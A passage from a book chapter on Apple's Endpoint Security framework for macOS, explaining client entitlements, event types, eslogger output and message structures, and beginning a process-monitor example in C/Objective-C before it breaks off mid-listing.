<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><section epub:type="chapter" role="doc-chapter" aria-labelledby="ch8">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_179" aria-label="179"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch8">&#13;
<span class="CN"><span class="SANS_Futura_Std_Bold_Condensed_B_11">8</span></span>&#13;
<span class="CT"><span class="Sans_Dogma_B">ENDPOINT SECURITY</span></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt="" width="377" height="376"/></figure>&#13;
<p class="CO">If you’ve made it this far in the book, you might have concluded that writing security tools for macOS is a challenging venture largely because of Apple itself. For example, if you want to capture the memory of a remote process, you’re out of luck, and enumerating all persistently installed items is possible, as you saw in <span class="chapterintro_Xref"><a href="chapter5.xhtml">Chapter 5</a></span>, yet requires reverse engineering a proprietary, undocumented database.</p>&#13;
<p class="TX">But I’m not here to bash Apple, and as this chapter will demonstrate, the company has responded to our pleas by releasing Endpoint Security. Introduced in macOS 10.15 (Catalina), it’s the first Apple framework designed specifically to help third-party developers build advanced user-mode security tools, such as those focused on detecting malware.<sup><a role="doc-noteref" id="chapter8_1" href="#chapter8-1">1</a></sup> It’s hard to overstate the importance and power of Endpoint Security, which is why I’m dedicating two entire chapters to it.</p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_180" aria-label="180"/>In this chapter, I’ll provide an overview of the framework and discuss how to use its APIs to perform actions such as monitoring file and process events. The next chapter will focus on more advanced topics, such as muting and authorization events. In <a href="part3.xhtml">Part III</a>, I’ll show you how to build several tools atop Endpoint Security.</p>&#13;
<p class="TX">The majority of the code snippets presented in this chapter and the next come directly from the <i>ESPlayground</i> project, found in the Chapter 8 folder of this book’s GitHub repository (<a href="https://github.com/Objective-see/TAOMM"><i>https://<wbr/>github<wbr/>.com<wbr/>/Objective<wbr/>-see<wbr/>/TAOMM</i></a>). This project contains the code in its entirety, so if you’re looking to build your own Endpoint Security tools, I recommend starting there.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1" id="sec1"><span id="h1-52"/><span class="SANS_Futura_Std_Bold_B_11">The Endpoint Security Workflow</span></h3>&#13;
<p class="TNI">Endpoint Security allows you to create a program (a <i>client</i>, in Apple parlance) and register for (or <i>subscribe to</i>) events of interest. Whenever these events occur on the system, Endpoint Security will deliver a message to your program. It can also block the events’ execution until your tool authorizes them. For example, imagine you’re interested in being notified anytime a new process starts so you can make sure it’s not malware. Using Endpoint Security, you can specify whether you’d like to simply receive notifications about new processes or whether the system should hold off on spawning the process until you’ve examined and authorized it.</p>&#13;
<p class="TX">Many of Objective-See’s tools use Endpoint Security in the way I’ve just described. For example, BlockBlock uses Endpoint Security to monitor for persistent file events and to block non-notarized processes and scripts. <a href="chapter8.xhtml#fig8-1">Figure 8-1</a> shows BlockBlock stopping malware that exploited a zero-day exploit (CVE-2021-30657) to bypass macOS code signing and notarization checks.</p>&#13;
<p class="TX">To keep malicious actors from abusing Endpoint Security’s power, macOS requires any tools leveraging it to fulfill several requirements. Most notable is obtaining the coveted <i>com.apple.developer.endpoint-security.client</i> entitlement from Apple. In <a href="part3.xhtml">Part III</a> of this book, I’ll explain exactly how to ask Apple for this entitlement and, once it’s granted, generate and apply a provisioning profile so that you can deploy your tools to other macOS systems.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_181" aria-label="181"/>&#13;
<figure class="IMG"><img class="img1" id="fig8-1" src="../images/Figure8-1.jpg" alt="" width="1390" height="1190"/>&#13;
<figcaption><p class="CAP"><span class="SANS_Futura_Std_Book_Oblique_I_11">Figure 8-1: BlockBlock uses Endpoint Security to stop untrusted scripts and processes from running.</span></p></figcaption>&#13;
</figure>&#13;
<p class="TX">For now, as noted in the book’s introduction, disabling System Integrity Protection (SIP) and Apple Mobile File Integrity (AMFI) will allow you to locally develop and test tools that leverage Endpoint Security. You’ll still have to add the client entitlement, but with these two macOS security mechanisms disabled, you can grant it to yourself. In the <i>ESPlayground</i> project, you’ll find the required Endpoint Security client entitlement in the <i>ESPlayground .entitlements</i> file (<a href="chapter8.xhtml#Lis8-1">Listing 8-1</a>).</p>&#13;
<span id="Lis8-1"/>&#13;
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;&#13;
...&#13;
&lt;plist version="1.0"&gt;&#13;
&lt;dict&gt;&#13;
    &lt;key&gt;<b>com.apple.developer.endpoint-security.client</b>&lt;/key&gt;&#13;
    &lt;true/&gt;&#13;
&lt;/dict&gt;&#13;
&lt;/plist&gt;&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-1: Specifying the required client entitlement</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_182" aria-label="182"/>The Code Signing Entitlements build setting references this file, so at compile time, it will be added to the project’s application bundle. As such, on a system with SIP and AMFI disabled, subscribing to and receiving Endpoint Security events will succeed.</p>&#13;
<p class="TX">If you’re designing a tool that leverages Endpoint Security, you’ll likely take the same four steps:</p>&#13;
<p class="NLF">  1.  Declare events of interest.</p>&#13;
<p class="NL">  2.  Create a new client and callback handler block.</p>&#13;
<p class="NL">  3.  Subscribe to events.</p>&#13;
<p class="NLL">  4.  Process events delivered to the handler block.</p>&#13;
<p class="TX">Let’s look at each of these steps, starting with understanding events of interest.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h4 class="H2" id="sec2"><span id="h2-60"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Events of Interest</span></h4>&#13;
<p class="TNI">You can find the list of Endpoint Security events in the <i>ESTypes.h</i> header file. If you have Xcode installed, this and other Endpoint Security header files should live in its SDK directory: <i>/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/EndpointSecurity</i>. While Apple’s official developer documentation is sometimes incomplete, the header files <i>ESClient.h</i>, <i>ESMessage.h</i>, <i>EndpointSecurity.h</i>, and <i>ESTypes.h</i> are extremely well commented, and you should consider them authoritative sources of Endpoint Security information.</p>&#13;
<p class="TX">Within <i>ESTypes.h</i>, you can find the list of Endpoint Security events in an <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_type_t</span> enumeration:</p>&#13;
&#13;
<pre><code>/**&#13;
 * The valid event types recognized by EndpointSecurity&#13;
 *&#13;
 ...&#13;
 *&#13;
*/&#13;
typedef enum {&#13;
&#13;
  // The following events are available beginning in macOS 10.15.&#13;
  ES_EVENT_TYPE_AUTH_EXEC,&#13;
  ES_EVENT_TYPE_AUTH_OPEN,&#13;
  ES_EVENT_TYPE_AUTH_KEXTLOAD,&#13;
  ...&#13;
  ES_EVENT_TYPE_NOTIFY_EXEC,&#13;
  ...&#13;
  ES_EVENT_TYPE_NOTIFY_EXIT,&#13;
  ...&#13;
&#13;
  // The following events are available beginning in macOS 13.0.&#13;
  ES_EVENT_TYPE_NOTIFY_AUTHENTICATION,&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_183" aria-label="183"/>  ES_EVENT_TYPE_NOTIFY_XP_MALWARE_DETECTED,&#13;
  ES_EVENT_TYPE_NOTIFY_XP_MALWARE_REMEDIATED,&#13;
  ...&#13;
  ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD,&#13;
  ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_REMOVE,&#13;
&#13;
  // The following events are available beginning in macOS 14.0.&#13;
  ...&#13;
  ES_EVENT_TYPE_NOTIFY_XPC_CONNECT,&#13;
&#13;
  // The following events are available beginning in macOS 15.0.&#13;
  ES_EVENT_TYPE_NOTIFY_GATEKEEPER_USER_OVERRIDE,&#13;
  ...&#13;
&#13;
  ES_EVENT_TYPE_LAST&#13;
} es_event_type_t;&#13;
</code></pre>&#13;
<p class="TX">Let’s make a few observations. First, as the comments in the header file show, not all events are available on all versions of macOS. For example, you’ll find events related to XProtect malware detection or the addition of persistence items beginning in macOS 13 only.</p>&#13;
<p class="TX">Second, although this header file and Apple’s developer documentation don’t directly document these event types, their names should give you a general idea of their purposes. For example, a tool interested in passively monitoring process executions should subscribe to the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY _EXEC</span> event. Also, as we’ll see, each event type is tied to a corresponding event structure, such as an <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span>. The framework header files document these well.</p>&#13;
<p class="TX">Finally, the names in the header file fall into two categories: <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT _TYPE_AUTH_*</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_*</span>. Authorization events most often originate from kernel mode and enter a pending state once delivered to Endpoint Security clients, requiring the client to explicitly authorize or deny them. For example, to allow only notarized processes to run, you’d first register for <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_AUTH_EXEC</span> events, then check each delivered event and authorize only those that represent the spawning of notarized processes. I’ll discuss authorization events in the next chapter. Notification events originate in user mode and are for events that have already occurred. If you’re creating passive monitoring tools, such as a process monitor, you’ll subscribe to these.</p>&#13;
<p class="TX">The built-in macOS utility <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span>, found in <i>/usr/bin</i>, provides a way to easily explore the Endpoint Security subsystem, as it captures and outputs Endpoint Security notifications directly from the terminal. For example, say you’d like to build a process monitor. What Endpoint Security events should your monitor subscribe to in order to receive information about processes? The <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> event looks promising. Let’s use macOS’s <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span> to see if we’re on the right track.</p>&#13;
<p class="TX">To capture and output Endpoint Security events of interest, execute <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span> with <i>root</i> privileges from the terminal while specifying the name <span role="doc-pagebreak" epub:type="pagebreak" id="pg_184" aria-label="184"/>of the event. The tool uses short names for Endpoint Security notification events, which you can list via the <span class="SANS_TheSansMonoCd_W7Bold_B_11">--list-events</span> command line option:</p>&#13;
&#13;
<pre><code># <b>eslogger --list-events</b>&#13;
access&#13;
authentication&#13;
...&#13;
exec&#13;
...&#13;
</code></pre>&#13;
<p class="TX">To view <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> events, pass <span class="SANS_TheSansMonoCd_W7Bold_B_11">exec</span> to <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span>:</p>&#13;
&#13;
<pre><code># <b>eslogger exec</b></code></pre>&#13;
<p class="TX">Once <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span> is capturing process execution events, try executing a command such as <span class="SANS_TheSansMonoCd_W5Regular_11">say</span> with the arguments <span class="SANS_TheSansMonoCd_W5Regular_11">Hello World</span>. The tool should output detailed information about the executed event.<sup><a role="doc-noteref" id="chapter8_2" href="#chapter8-2">2</a></sup> Here is a snippet of this output (which might look slightly different on your system, depending on your version of macOS):</p>&#13;
&#13;
<pre><code># <b>eslogger exec</b>&#13;
{&#13;
    "event_type": 9,&#13;
        "event": {&#13;
            "exec": {&#13;
                "script": null,&#13;
                "target": {&#13;
                    "signing_id": "com.apple.say",&#13;
                    "executable": {&#13;
                    "path": "\/usr\/bin\/say",&#13;
                    "ppid": 1152,&#13;
                    ...&#13;
                    "is_platform_binary": true,&#13;
                    "audit_token": {&#13;
                        ...&#13;
                    },&#13;
                    "original_ppid": 1152,&#13;
                    "cdhash": "6C92E006B491C58B62F0C66E2D880CE5FE015573",&#13;
                    "team_id": null&#13;
                },&#13;
                "image_cpusubtype": -2147483646,&#13;
                "image_cputype": 16777228,&#13;
                "args": ["say", "Hello", "World"],&#13;
                ...&#13;
}&#13;
</code></pre>&#13;
<p class="TX">As you can see, Endpoint Security provided not only the basics, such as the path and process ID of the newly executed process, but also code signing information, arguments, the parent PID, and more. Leveraging Endpoint Security can greatly simplify any security tool, saving it from having to generate additional information about the event itself.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_185" aria-label="185"/>&#13;
<h4 class="H2" id="sec3"><span id="h2-61"/><span class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Clients, Handler Blocks, and Event Handling</span></h4>&#13;
<p class="TNI">Now, you may be wondering how to subscribe to events and then programmatically interact with the information found within them. For example, how can you extract the path or arguments for the process notification event <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span>? First, you must create an Endpoint Security client.</p>&#13;
<p class="TX">To create a new client, processes can invoke the Endpoint Security function <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span>, which accepts a callback handler block and an out pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_client_t</span> that Endpoint Security will initialize with the new client. The function returns a result of type <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client_result_t</span> set to <span class="SANS_TheSansMonoCd_W5Regular_11">ES_NEW_CLIENT_RESULT_SUCCESS</span> if the call succeeds. It might also return one of the following failure values, as detailed in <i>ESClient.h</i>:</p>&#13;
<blockquote>&#13;
<p class="EX1"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_NEW_CLIENT_RESULT_ERR_NOT_ENTITLED</b></span> The caller doesn’t have the <i>com.apple.developer.endpoint-security.client</i> entitlement.</p>&#13;
<p class="EX"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_NEW_CLIENT_RESULT_ERR_NOT_PERMITTED</b></span> The caller isn’t permitted to connect to the Endpoint Security subsystem, as it lacks TCC approval from the user.</p>&#13;
<p class="EX2"><span class="SANS_TheSansMonoCd_W5Regular_11"><b>ES_NEW_CLIENT_RESULT_ERR_NOT_PRIVILEGED</b></span> The caller isn’t running with root privileges.</p>&#13;
</blockquote>&#13;
<p class="TX">The header file provides additional details on these errors, as well as recommendations on how to fix each.</p>&#13;
<p class="TX">After you’ve subscribed to events, the framework will automatically invoke the callback handler block passed to the <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span> function for each event. In the invocation, the framework includes a pointer to a client and an <span class="SANS_TheSansMonoCd_W5Regular_11">es_message_t</span> structure that will contain detailed information about the delivered event. The <i>ESMessage.h</i> file defines this message type:</p>&#13;
&#13;
<pre><code>typedef struct {&#13;
    uint32_t version;&#13;
    struct timespec time;&#13;
    uint64_t mach_time;&#13;
    uint64_t deadline;&#13;
    es_process_t* _Nonnull process;&#13;
    uint64_t seq_num; /* field available only if message version &gt;= 2 */&#13;
    es_action_type_t action_type;&#13;
    union {&#13;
        es_event_id_t auth;&#13;
        es_result_t notify;&#13;
    } action;&#13;
    es_event_type_t event_type;&#13;
    es_events_t event;&#13;
    es_thread_t* _Nullable thread; /* field available only if message version &gt;= 4 */&#13;
    uint64_t global_seq_num; /* field available only if message version &gt;= 4 */&#13;
    uint64_t opaque[]; /* Opaque data that must not be accessed directly */&#13;
} es_message_t;&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_186" aria-label="186"/>We can consult the header file for a brief description of each structure member (or run <span class="SANS_TheSansMonoCd_W5Regular_11">eslogger</span> to view this full structure for each event), but let’s cover a few important members here. At the start of the structure is the version field. This field is useful, as certain other fields may appear only in later versions. For example, the process’s CPU type (<span class="SANS_TheSansMonoCd_W5Regular_11">image_cputype</span>) is available only if the version field is of type 6 or newer. Next are various timestamps and a deadline. I’ll discuss the deadline in <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span>, as it plays an important role when dealing with event authorizations.</p>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure describes the process responsible for taking the action that triggered the event. Shortly, we’ll explore <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structures in more detail, but for now, it suffices to understand that they contain information about a process, including audit tokens, code signing information, paths, and more.</p>&#13;
<p class="TX">The next member discussed is the <span class="SANS_TheSansMonoCd_W5Regular_11">event_type</span>, which will be set to the type of event that was delivered, for example, <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span>. This is useful because clients usually register for multiple event types. As each event type contains different data, it’s important to determine which event you’re dealing with. For example, a process monitor might do this with a <span class="SANS_TheSansMonoCd_W5Regular_11">switch</span> statement (<a href="chapter8.xhtml#Lis8-2">Listing 8-2</a>).</p>&#13;
<span id="Lis8-2"/>&#13;
<pre><code>switch(message-&gt;event_type) {&#13;
    case ES_EVENT_TYPE_NOTIFY_EXEC:&#13;
        // Add code here to handle exec events.&#13;
        break;&#13;
&#13;
    case ES_EVENT_TYPE_NOTIFY_FORK:&#13;
        // Add code here to handle fork events.&#13;
        break;&#13;
&#13;
    case ES_EVENT_TYPE_NOTIFY_EXIT:&#13;
        // Add code here to handle exit events.&#13;
        break;&#13;
&#13;
    default:&#13;
        break;&#13;
}&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-2: Handling multiple message types</span></p>&#13;
<p class="TX">The event-type-specific data in the <span class="SANS_TheSansMonoCd_W5Regular_11">es_message_t</span> structure has a type of <span class="SANS_TheSansMonoCd_W5Regular_11">es_events_t</span>. This type is a large union of types, found in <i>ESMessage.h</i>, that map to Endpoint Security events. For example, in this union, we find <span class="SANS_TheSansMonoCd_W5Regular_11">es _event_exec_t</span>, the event type for <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span>. The same header file contains the definition of <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span>:</p>&#13;
&#13;
<pre><code>/**&#13;
 * @brief Execute a new process.&#13;
 * @field target The new process that is being executed.&#13;
 * @field script The script being executed by the interpreter.&#13;
 ...&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_187" aria-label="187"/>*/&#13;
typedef struct {&#13;
    es_process_t* _Nonnull target;&#13;
    es_string_token_t dyld_exec_path; /* field available only if message version &gt;= 7 */&#13;
    union {&#13;
        uint8_t reserved[64];&#13;
        struct {&#13;
            es_file_t* _Nullable script; /* field available only if message version &gt;= 2 */&#13;
            es_file_t* _Nonnull cwd; /* field available only if message version &gt;= 3 */&#13;
            int last_fd; /* field available only if message version &gt;= 4 */&#13;
            cpu_type_t image_cputype; /* field available only if message version &gt;= 6 */&#13;
            cpu_subtype_t image_cpusubtype; /* field available only if message version &gt;= 6 */&#13;
            };&#13;
        };&#13;
} es_event_exec_t;&#13;
</code></pre>&#13;
<p class="TX">Again, consult the header file for detailed comments about each member of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_event_exec_t</span> structure. Most relevant is the member named <span class="SANS_TheSansMonoCd_W5Regular_11">target</span>, a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure representing the new process that is executed. Let’s take a closer look at this structure to see what information it provides about a process:</p>&#13;
&#13;
<pre><code>/**&#13;
 * @brief Information related to a process. This is used both for describing processes ...&#13;
(e.g., for exec events, this describes the new process being executed).&#13;
 *&#13;
 * @field audit_token Audit token of the process&#13;
 * @field ppid Parent pid of the process&#13;
 ...&#13;
 * @field signing_id The signing id of the code signature associated with this process&#13;
 * @field team_id The team id of the code signature associated with this process&#13;
 * @field executable The executable file that is executing in this process&#13;
...&#13;
*/&#13;
typedef struct {&#13;
    audit_token_t audit_token;&#13;
    pid_t ppid;&#13;
    pid_t original_ppid;&#13;
    pid_t group_id;&#13;
    pid_t session_id;&#13;
    uint32_t codesigning_flags;&#13;
    bool is_platform_binary;&#13;
    bool is_es_client;&#13;
    uint8_t cdhash[20];&#13;
    es_string_token_t signing_id;&#13;
    es_string_token_t team_id;&#13;
    es_file_t* _Nonnull executable;&#13;
    es_file_t* _Nullable tty;&#13;
    struct timeval start_time;&#13;
    audit_token_t responsible_audit_token;&#13;
    audit_token_t parent_audit_token;&#13;
} es_process_t;&#13;
</code></pre>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_188" aria-label="188"/>As with other structures in the header files, comments explain the many structure members. Of particular interest to us are the following:</p>&#13;
<ul class="ul">&#13;
<li class="BL">Audit tokens (such as <span class="SANS_TheSansMonoCd_W5Regular_11">audit_token</span>, <span class="SANS_TheSansMonoCd_W5Regular_11">responsible_audit_token</span>, and <span class="SANS_TheSansMonoCd_W5Regular_11">parent_audit_token</span>)</li>&#13;
<li class="BL">Code signing information (such as <span class="SANS_TheSansMonoCd_W5Regular_11">signing_id</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">team_id</span>)</li>&#13;
<li class="BL">The executable (<span class="SANS_TheSansMonoCd_W5Regular_11">executable</span>)</li>&#13;
</ul>&#13;
<p class="TX">In previous chapters, I discussed the usefulness of building process hierarchies and the challenges of creating accurate ones. The Endpoint Security subsystem provides us with the audit tokens of both the direct parent and responsible process that spawned the new process, making building an accurate process hierarchy for the newly spawned process a breeze. The <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure contains this information directly, so we’re no longer required to manually build such hierarchies.</p>&#13;
<p class="TX">Let’s now talk about the <span class="SANS_TheSansMonoCd_W5Regular_11">executable</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">es_process_t</span> structure, a pointer to an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span> structure. As shown in the following structure definition, an <span class="SANS_TheSansMonoCd_W5Regular_11">es_file_t</span> structure provides the path to a file on disk, such as to a process’s binary:</p>&#13;
&#13;
<pre><code>/**&#13;
 * @brief es_file_t provides the stat information and path to a file.&#13;
&#13;
 * @field path Absolute path of the file&#13;
 * @field path_truncated Indicates if the path field was truncated&#13;
 ...&#13;
*/&#13;
typedef struct {&#13;
    es_string_token_t path;&#13;
    bool path_truncated;&#13;
    struct stat stat;&#13;
} es_file_t;&#13;
</code></pre>&#13;
<p class="TX">To get the actual path, you must understand one more structure, <span class="SANS_TheSansMonoCd_W5Regular_11">es_string_token_t</span>. You’ll come across it often, as it’s how Endpoint Security stores strings such as filepaths. This simple structure defined in <i>ESTypes.h</i> contains only two members:</p>&#13;
&#13;
<pre><code>/**&#13;
 * @brief Structure for handling strings&#13;
*/&#13;
typedef struct {&#13;
    size_t length;&#13;
    const char* data;&#13;
} es_string_token_t;&#13;
</code></pre>&#13;
<p class="TX">The <span class="SANS_TheSansMonoCd_W5Regular_11">length</span> member of the structure is the length of the string token. A comment in the header file notes that it’s equivalent to the value returned by <span class="SANS_TheSansMonoCd_W5Regular_11">strlen</span>. You shouldn’t actually use <span class="SANS_TheSansMonoCd_W5Regular_11">strlen</span> on the string data, however, as the <span class="SANS_TheSansMonoCd_W5Regular_11">data</span> member of the structure isn’t guaranteed to be <span class="SANS_TheSansMonoCd_W5Regular_11">NULL</span> terminated. To print <span class="SANS_TheSansMonoCd_W5Regular_11">es_string_token_t</span> structures as a C-string, use the <span class="SANS_TheSansMonoCd_W5Regular_11">%.*s</span> format string, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_189" aria-label="189"/>which expects two arguments: the maximum number of characters to print and then a pointer to the characters (<a href="chapter8.xhtml#Lis8-3">Listing 8-3</a>).</p>&#13;
<span id="Lis8-3"/>&#13;
<pre><code>es_string_token_t* responsibleProcessPath = &amp;message-&gt;process-&gt;executable-&gt;path;&#13;
printf("responsible process: %.*s\n",&#13;
(int)responsibleProcessPath-&gt;length, responsibleProcessPath-&gt;data);&#13;
&#13;
es_string_token_t* newProcessPath = &amp;message-&gt;event.exec.target-&gt;executable-&gt;path;&#13;
printf("new process: %.*s\n", (int)newProcessPath-&gt;length, newProcessPath-&gt;data);&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-3: Outputting <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">es_string_token_t</span> structures from within <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">es_process_t</span> structures</span></p>&#13;
<p class="TX">First, the code extracts the string token for the process responsible for triggering the Endpoint Security event. It then prints out the path of this process, using the aforementioned format string and the <span class="SANS_TheSansMonoCd_W5Regular_11">length</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">data</span> members of the string token structure. Recall that when an <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> event occurs, the structure describing the newly spawned process can be found in the <span class="SANS_TheSansMonoCd_W5Regular_11">target</span> member of the <span class="SANS_TheSansMonoCd_W5Regular_11">exec</span> structure (located in the message’s <span class="SANS_TheSansMonoCd_W5Regular_11">event</span> structure). The code then accesses this structure to print out the path of the newly spawned process.</p>&#13;
<p class="TX">Now, you’ll probably want to do more than just print out information about events. For example, for all new processes, you might extract their paths and store them in an array or pass each path to a function that checks if they’re notarized. To achieve this, you’ll likely want to convert the string token into a more programmatically friendly object such as an <span class="SANS_TheSansMonoCd_W5Regular_11">NSString</span>. As shown in <a href="chapter8.xhtml#Lis8-4">Listing 8-4</a>, you can do this in a single line of code.</p>&#13;
<span id="Lis8-4"/>&#13;
<pre><code>NSString* string = [[NSString alloc] initWithBytes:stringToken-&gt;data length:stringToken-&gt;&#13;
length encoding:NSUTF8StringEncoding];&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-4: Converting an <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">es_string_token_t</span> to an <span class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">NSString</span></span></p>&#13;
<p class="TX">The code makes use of the <span class="SANS_TheSansMonoCd_W5Regular_11">NSString initWithBytes:length:encoding:</span> method, passing in the string token’s <span class="SANS_TheSansMonoCd_W5Regular_11">data</span> and <span class="SANS_TheSansMonoCd_W5Regular_11">length</span> members and the string encoding <span class="SANS_TheSansMonoCd_W5Regular_11">NSUTF8StringEncoding</span>.</p>&#13;
<p class="TX">To actually start receiving events, you have to subscribe! With an Endpoint Security client in hand, invoke the <span class="SANS_TheSansMonoCd_W5Regular_11">es_subscribe</span> API. As its parameters, it takes the newly created client, an array of events, and the number of events to subscribe to, which here includes process execution and exit events (<a href="chapter8.xhtml#Lis8-5">Listing 8-5</a>).</p>&#13;
<span id="Lis8-5"/>&#13;
<pre><code>es_client_t* client = NULL;&#13;
es_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};&#13;
&#13;
es_new_client(&amp;client, ^(es_client_t* client, const es_message_t* message) {&#13;
    // Add code here to handle delivered events.&#13;
});&#13;
&#13;
es_subscribe(client, events, sizeof(events)/sizeof(events[0])); <span class="codewide_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-5: Subscribing to events</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_190" aria-label="190"/>Note that we compute the number of events rather than hardcoding it <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Once the <span class="SANS_TheSansMonoCd_W5Regular_11">es_subscribe</span> function returns with no error, the Endpoint Security subsystem will begin asynchronously delivering events that match the types to which we have subscribed. Specifically, it will invoke the handler block we specified when creating the client.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
&#13;
<h3 class="H1" id="sec4"><span id="h1-53"/><span class="SANS_Futura_Std_Bold_B_11">Creating a Process Monitor</span></h3>&#13;
<p class="TNI">Let’s put what we’ve learned to use by creating a process monitor that relies on Endpoint Security. We’ll first subscribe to process events such as <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> and then parse pertinent process information as we receive events.</p>&#13;
<blockquote>&#13;
<p class="NOTE"><span class="SANS_Dogma_OT_Bold_B_21">NOTE</span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>Only relevant snippets are provided here, but you can find the code in its entirety in the</i> <span class="note_Italic">ESPlayground</span> <i>project’s</i> <span class="note_Italic">monitor.m</span> <i>file. You can also find an open source, production-ready process monitor build atop Endpoint Security in the</i> <span class="note_Italic">ProcessMonitor</span> <i>project in Objective-See’s GitHub repository at</i> <a href="https://github.com/objective-see/ProcessMonitor"><span class="note_LinkURL_Italic">https://github.com/objective-see/ProcessMonitor</span><i>.</i></a></p>&#13;
<p class="TX">We begin by specifying which Endpoint Security events we’re interested in. For a simple process monitor, we could stick to just the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXEC</span> event. However, we’ll also register for the <span class="SANS_TheSansMonoCd_W5Regular_11">ES_EVENT_TYPE_NOTIFY_EXIT</span> event to track process exits. We put these event types into an array (<a href="chapter8.xhtml#Lis8-6">Listing 8-6</a>). Once we create an Endpoint Security client, we’ll subscribe to the events.</p>&#13;
<span id="Lis8-6"/>&#13;
<pre><code>es_event_type_t events[] = {ES_EVENT_TYPE_NOTIFY_EXEC, ES_EVENT_TYPE_NOTIFY_EXIT};</code></pre>&#13;
<p class="ListingCaption"><span class="SANS_Futura_Std_Book_Oblique_I_11">Listing 8-6: Events of interest to a simple process monitor</span></p>&#13;
<p class="TX">In <a href="chapter8.xhtml#Lis8-7">Listing 8-7</a>, we create a client via the <span class="SANS_TheSansMonoCd_W5Regular_11">es_new_client</span> API.</p>&#13;
<span id="Lis8-7"/>&#13;
<pre><code>es_client_t* client = NULL;&#13;
es_new_client_result_t result =&#13;
